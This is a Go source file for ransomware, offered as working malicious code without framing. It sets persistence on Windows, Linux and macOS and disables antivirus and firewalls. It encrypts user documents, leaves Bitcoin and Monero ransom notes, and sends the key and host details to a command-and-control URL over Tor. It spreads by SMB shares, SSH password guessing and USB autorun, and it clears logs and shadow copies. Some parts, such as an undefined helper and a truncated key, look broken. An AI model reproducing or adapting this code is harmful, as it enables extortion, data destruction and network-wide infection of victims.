package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows/registry"
)

// ======================
// ADVANCED CONFIGURATION
// ======================
const C2_SERVER = "https://malicious-c2.example/api/v1/command"
var ENCRYPT_EXTENSIONS = []string{".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".jpeg", ".png", ".txt", ".zip", ".rar", ".7z", ".sql", ".db", ".bak", ".ppt", ".pptx"}
const MAX_THREADS = 12
const RANSOM_AMOUNT = 1.2
const BTC_ADDRESS = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
const XMR_ADDRESS = "48jewbtxe4jU3MnzJjrcwQbJdZ3XeXyZ1YwUZ6WkDv7Cb1h7sRkX3nYdPcN9zQdR7tZ6E2b9X"
const CONTACT_TOR = "http://rans0mpr0t.onion/decrypt"
const MAX_FILE_SIZE = 250 * 1024 * 1024 // 250MB
const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo
4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u
+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh
kd3qqGElvW/VDL5AaWTg0nLVkjQ9Q+9XQC9XzcoBdFR6J7O7D5gU7W8jH6Uc7Z5K
tY0GvC1pbRcSe1Z5yN9d6c5SpdSJQIDAQAB
-----END PUBLIC KEY-----`

// ======================
// GLOBAL STRUCTURES
// ======================
type SystemInfo struct {
	Hostname    string   `json:"hostname"`
	Username    string   `json:"username"`
	OS          string   `json:"os"`
	IP          string   `json:"ip"`
	CPU         int      `json:"cpu_cores"`
	GPU         string   `json:"gpu"`
	Disks       []string `json:"disks"`
	NetworkInfo string   `json:"network_info"`
}

type RansomNote struct {
	AmountBTC   float64 `json:"btc"`
	AmountXMR   float64 `json:"xmr"`
	BTCAddress  string  `json:"btc_address"`
	XMRAddress  string  `json:"xmr_address"`
	TorURL      string  `json:"tor_url"`
	VictimID    string  `json:"victim_id"`
	Contact     string  `json:"contact"`
	Deadline    int64   `json:"deadline"`
}

// ======================
// UTILITY FUNCTIONS
// ======================
func init() {
	// Set random seed
	seed := time.Now().UnixNano()
	crand.Reader.Read(make([]byte, 8))
}

func getSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	ip := getLocalIP()

	// Get CPU count
	cpu := runtime.NumCPU()

	// Get disk information (simplified)
	var disks []string
	if runtime.GOOS == "windows" {
		for drive := 'A'; drive <= 'Z'; drive++ {
			drivePath := string(drive) + ":\\"
			if _, err := os.Stat(drivePath); err == nil {
				disks = append(disks, drivePath)
			}
		}
	} else {
		disks = []string{"/"}
	}

	// Network info
	var netInfo string
	if runtime.GOOS == "windows" {
		cmd := exec.Command("ipconfig", "/all")
		output, _ := cmd.Output()
		netInfo = string(output)
	} else {
		cmd := exec.Command("ifconfig", "-a")
		output, _ := cmd.Output()
		netInfo = string(output)
	}

	return SystemInfo{
		Hostname:    hostname,
		Username:    user.Username,
		OS:          runtime.GOOS,
		IP:          ip,
		CPU:         cpu,
		Disks:       disks,
		NetworkInfo: netInfo,
	}
}

func generateVictimID() string {
	hash := sha256.New()
	hash.Write([]byte(fmt.Sprintf("%d%s%s", time.Now().UnixNano(), getSystemInfo().Hostname, getSystemInfo().IP)))
	return base64.URLEncoding.EncodeToString(hash.Sum(nil))[:16]
}

// ======================
// CORE FUNCTIONALITY
// ======================
func establishPersistence() {
	currentFile, err := os.Executable()
	if err != nil {
		return
	}

	switch runtime.GOOS {
	case "windows":
		// Multiple persistence methods
		systemPaths := []string{
			filepath.Join(os.Getenv("WINDIR"), "System32", "dllhost.exe"),
			filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "update.exe"),
		}

		for _, path := range systemPaths {
			if err := copyFile(currentFile, path); err == nil {
				setHidden(path)
			}
		}

		// Registry persistence
		regPaths := []string{
			`Software\Microsoft\Windows\CurrentVersion\Run`,
			`Software\Microsoft\Windows\CurrentVersion\RunOnce`,
			`Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`,
		}

		for _, regPath := range regPaths {
			key, err := registry.OpenKey(registry.CURRENT_USER, regPath, registry.WRITE)
			if err == nil {
				key.SetStringValue("WindowsUpdate", systemPaths[0])
				key.Close()
			}
		}

	case "linux":
		// Systemd service
		servicePath := "/etc/systemd/system/.systemd-helper.service"
		serviceConfig := fmt.Sprintf(`[Unit]
Description=System Helper Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target`, currentFile)

		os.WriteFile(servicePath, []byte(serviceConfig), 0644)
		exec.Command("systemctl", "daemon-reload").Run()
		exec.Command("systemctl", "enable", ".systemd-helper.service").Run()

		// Cron persistence
		exec.Command("sh", "-c", `(crontab -l 2>/dev/null; echo "@reboot sleep 120 && `+currentFile+`") | crontab -`).Run()

	case "darwin":
		// LaunchAgent persistence
		launchAgentPath := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents", "com.apple.softwareupdate.plist")
		agentConfig := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.apple.softwareupdate</string>
	<key>ProgramArguments</key>
	<array>
		<string>%s</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>`, currentFile)

		os.WriteFile(launchAgentPath, []byte(agentConfig), 0644)
		exec.Command("launchctl", "load", launchAgentPath).Run()
	}
}

func disableDefenses() {
	switch runtime.GOOS {
	case "windows":
		// Disable security services
		services := []string{"WinDefend", "wscsvc", "SecurityHealthService", "Sense", "MsMpSvc", "WdNisSvc"}
		for _, service := range services {
			exec.Command("net", "stop", service, "/y").Run()
			exec.Command("sc", "config", service, "start=", "disabled").Run()
		}

		// Disable Windows Defender
		exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true").Run()
		
		// Disable firewall
		exec.Command("netsh", "advfirewall", "set", "allprofiles", "state", "off").Run()

		// Disable security tools
		securityProcesses := []string{"msmpeng", "msseces", "avp", "bdagent", "avgtray", "mbam"}
		for _, proc := range securityProcesses {
			exec.Command("taskkill", "/F", "/IM", proc+".exe").Run()
		}

	default:
		// Linux/macOS security disable
		exec.Command("setenforce", "0").Run()
		exec.Command("systemctl", "stop", "apparmor").Run()
		exec.Command("systemctl", "stop", "firewalld").Run()
		exec.Command("ufw", "disable").Run()
		exec.Command("iptables", "-F").Run()
		exec.Command("chattr", "-i", "/etc/hosts").Run()
	}
}

func encryptFile(filePath string, cipher cipher.AEAD, victimID string) {
	// Skip sensitive paths
	if strings.Contains(filePath, "Windows") || 
	   strings.Contains(filePath, "Program Files") ||
	   strings.Contains(filePath, "System32") {
		return
	}

	// Skip large files
	if info, err := os.Stat(filePath); err == nil {
		if info.Size() > MAX_FILE_SIZE {
			return
		}
	}

	data, err := os.ReadFile(filePath)
	if err != nil {
		return
	}

	nonce := make([]byte, cipher.NonceSize())
	crand.Read(nonce)

	encrypted := cipher.Seal(nonce, nonce, data, nil)
	if err := os.WriteFile(filePath, encrypted, 0644); err == nil {
		newName := fmt.Sprintf("%s.%s.LOCKED", filePath, victimID)
		os.Rename(filePath, newName)
	}
}

func startEncryptionWorker(jobs <-chan string, cipher cipher.AEAD, victimID string, wg *sync.WaitGroup) {
	defer wg.Done()
	for filePath := range jobs {
		encryptFile(filePath, cipher, victimID)
	}
}

func encryptFiles(victimID string) {
	// Generate encryption key
	salt := make([]byte, 32)
	crand.Read(salt)
	password := make([]byte, 64)
	crand.Read(password)
	key := pbkdf2.Key(password, salt, 500000, 32, sha256.New)

	block, _ := aes.NewCipher(key)
	cipher, _ := cipher.NewGCM(block)

	// Create ransom note
	deadline := time.Now().Add(72 * time.Hour).Unix()
	note := RansomNote{
		AmountBTC:   RANSOM_AMOUNT,
		AmountXMR:   RANSOM_AMOUNT * 10, // Approximate conversion
		BTCAddress:  BTC_ADDRESS,
		XMRAddress:  XMR_ADDRESS,
		TorURL:      CONTACT_TOR,
		VictimID:    victimID,
		Contact:     "NO_EMAIL_USE_TOR_ONLY",
		Deadline:    deadline,
	}

	noteJSON, _ := json.Marshal(note)
	notePath := filepath.Join(os.Getenv("HOME"), "!!!READ_ME_"+victimID+".txt")
	os.WriteFile(notePath, noteJSON, 0644)

	// Display ransom note on desktop
	if runtime.GOOS == "windows" {
		desktopPath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "!!!READ_ME_"+victimID+".txt")
		os.WriteFile(desktopPath, noteJSON, 0644)
	}

	// Send encrypted key to C2
	sendToC2(victimID, key)

	// Parallel encryption with worker pool
	paths := getSystemPaths()
	jobs := make(chan string, 10000)
	var wg sync.WaitGroup

	// Start workers
	for w := 0; w < MAX_THREADS; w++ {
		wg.Add(1)
		go startEncryptionWorker(jobs, cipher, victimID, &wg)
	}

	// Find files and send to workers
	for _, path := range paths {
		filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			for _, ext := range ENCRYPT_EXTENSIONS {
				if strings.EqualFold(filepath.Ext(filePath), ext) {
					jobs <- filePath
					break
				}
			}
			return nil
		})
	}

	close(jobs)
	wg.Wait()
}

func propagateNetwork() {
	currentFile, _ := os.Executable()

	switch runtime.GOOS {
	case "windows":
		// Scan local network
		cmd := exec.Command("arp", "-a")
		output, _ := cmd.Output()
		scanner := bufio.NewScanner(bytes.NewReader(output))

		for scanner.Scan() {
			line := scanner.Text()
			fields := strings.Fields(line)
			if len(fields) < 2 {
				continue
			}

			ip := fields[0]
			if net.ParseIP(ip) != nil {
				// Try common shares
				shares := []string{"C$", "ADMIN$", "IPC$", "Shared"}
				for _, share := range shares {
					dest := fmt.Sprintf("\\\\%s\\%s\\Windows\\System32\\update.exe", ip, share)
					copyFile(currentFile, dest)
				}
			}
		}

	default:
		// SSH brute-force propagation
		localIP := getLocalIP()
		ipParts := strings.Split(localIP, ".")
		if len(ipParts) != 4 {
			return
		}

		baseIP := strings.Join(ipParts[:3], ".") + "."
		commonUsers := []string{"admin", "user", "root", "ubuntu", "ec2-user"}
		commonPasswords := []string{"password", "123456", "admin", "root", "qwerty", "letmein"}

		for i := 1; i < 255; i++ {
			if strconv.Itoa(i) == ipParts[3] {
				continue
			}

			targetIP := baseIP + strconv.Itoa(i)
			for _, user := range commonUsers {
				for _, pass := range commonPasswords {
					// Copy malware
					exec.Command("sshpass", "-p", pass, "scp", "-o", "StrictHostKeyChecking=no", 
						"-o", "ConnectTimeout=5", currentFile, 
						fmt.Sprintf("%s@%s:/tmp/.cache", user, targetIP)).Run()

					// Execute remotely
					exec.Command("sshpass", "-p", pass, "ssh", "-o", "StrictHostKeyChecking=no", 
						"-o", "ConnectTimeout=5", fmt.Sprintf("%s@%s", user, targetIP), 
						"chmod +x /tmp/.cache && /tmp/.cache &").Run()
				}
			}
		}
	}
}

func propagateUSB() {
	currentFile, _ := os.Executable()
	var drives []string

	if runtime.GOOS == "windows" {
		for drive := 'A'; drive <= 'Z'; drive++ {
			drivePath := string(drive) + ":\\"
			if _, err := os.Stat(drivePath); err == nil {
				drives = append(drives, drivePath)
			}
		}
	} else {
		media, _ := os.ReadDir("/media")
		for _, d := range media {
			drives = append(drives, filepath.Join("/media", d.Name()))
		}
		mnt, _ := os.ReadDir("/mnt")
		for _, d := range mnt {
			drives = append(drives, filepath.Join("/mnt", d.Name()))
		}
	}

	for _, drive := range drives {
		// Create decoy files
		decoys := []struct {
			name    string
			content string
		}{
			{"IMPORTANT_DOCUMENTS.txt", "Your important documents are in the encrypted folder"},
			{"DECRYPT_INSTRUCTIONS.html", "<html><body><h1>Contact support for file recovery</h1></body></html>"},
		}

		for _, decoy := range decoys {
			os.WriteFile(filepath.Join(drive, decoy.name), []byte(decoy.content), 0644)
		}

		// Copy malware
		dest := filepath.Join(drive, "folder_icon.exe")
		if err := copyFile(currentFile, dest); err == nil {
			setHidden(dest)
		}

		// Create autorun (Windows)
		if runtime.GOOS == "windows" {
			autorun := fmt.Sprintf("[autorun]\nopen=%s\naction=Open documents\nicon=folder_icon.exe,0\n", dest)
			autorunPath := filepath.Join(drive, "autorun.inf")
			os.WriteFile(autorunPath, []byte(autorun), 0644)
			setHidden(autorunPath)
		}
	}
}

func sendToC2(victimID string, data []byte) {
	// Encrypt with RSA public key
	block, _ := pem.Decode([]byte(PUBLIC_KEY))
	if block == nil {
		return
	}

	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return
	}

	encrypted, err := rsa.EncryptOAEP(
		sha256.New(),
		crand.Reader,
		pubKey.(*rsa.PublicKey),
		data,
		nil,
	)
	if err != nil {
		return
	}

	// Prepare payload
	payload := map[string]interface{}{
		"victim_id": victimID,
		"system":    getSystemInfo(),
		"key":       base64.StdEncoding.EncodeToString(encrypted),
		"timestamp": time.Now().Unix(),
	}

	jsonData, _ := json.Marshal(payload)

	// Send through Tor proxy (simulated)
	proxyUrl, _ := url.Parse("socks5://127.0.0.1:9050")
	client := &http.Client{
		Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)},
		Timeout:   30 * time.Second,
	}

	client.Post(C2_SERVER, "application/json", bytes.NewBuffer(jsonData))
}

func destroyEvidence() {
	// Overwrite executable
	if currentFile, err := os.Executable(); err == nil {
		file, _ := os.OpenFile(currentFile, os.O_WRONLY, 0)
		file.Write(make([]byte, 1024*1024)) // Write 1MB of zeros
		file.Close()
		os.Remove(currentFile)
	}

	// Clear logs
	if runtime.GOOS == "windows" {
		exec.Command("wevtutil", "cl", "System").Run()
		exec.Command("wevtutil", "cl", "Application").Run()
		exec.Command("wevtutil", "cl", "Security").Run()
	} else {
		exec.Command("sh", "-c", "echo '' > /var/log/syslog").Run()
		exec.Command("sh", "-c", "echo '' > /var/log/auth.log").Run()
	}

	// Remove shadow copies
	if runtime.GOOS == "windows" {
		exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()
	}
}

// ======================
// MAIN FUNCTION
// ======================
func main() {
	// Anti-analysis checks
	if isDebugging() || isVirtualized() {
		os.Exit(0)
	}

	// Delay execution
	delay := time.Duration(300+time.Now().Unix()%600) * time.Second
	time.Sleep(delay)

	// Generate unique victim ID
	victimID := generateVictimID()

	// Execution phases
	establishPersistence()
	disableDefenses()
	
	go func() {
		propagateNetwork()
		propagateUSB()
	}()

	encryptFiles(victimID)
	destroyEvidence()

	// Final restart
	if runtime.GOOS == "windows" {
		exec.Command("shutdown", "/r", "/t", "0").Run()
	} else {
		exec.Command("reboot").Run()
	}
}

// ======================
// HELPER FUNCTIONS
// ======================
func isDebugging() bool {
	// Simple anti-debug check
	if runtime.GOOS == "windows" {
		_, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`, registry.READ)
		return err == nil
	}
	return false
}

func isVirtualized() bool {
	// Simple VM check
	if runtime.GOOS == "windows" {
		cmd := exec.Command("wmic", "computersystem", "get", "model")
		output, _ := cmd.Output()
		return strings.Contains(strings.ToLower(string(output)), "virtual")
	} else {
		cmd := exec.Command("systemd-detect-virt")
		output, _ := cmd.Output()
		return !strings.Contains(string(output), "none")
	}
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

func setHidden(path string) {
	if runtime.GOOS == "windows" {
		exec.Command("attrib", "+h", "+s", path).Run()
	} else {
		// Linux files are hidden by prefixing with dot
		dir, file := filepath.Split(path)
		newPath := filepath.Join(dir, "."+file)
		os.Rename(path, newPath)
	}
}
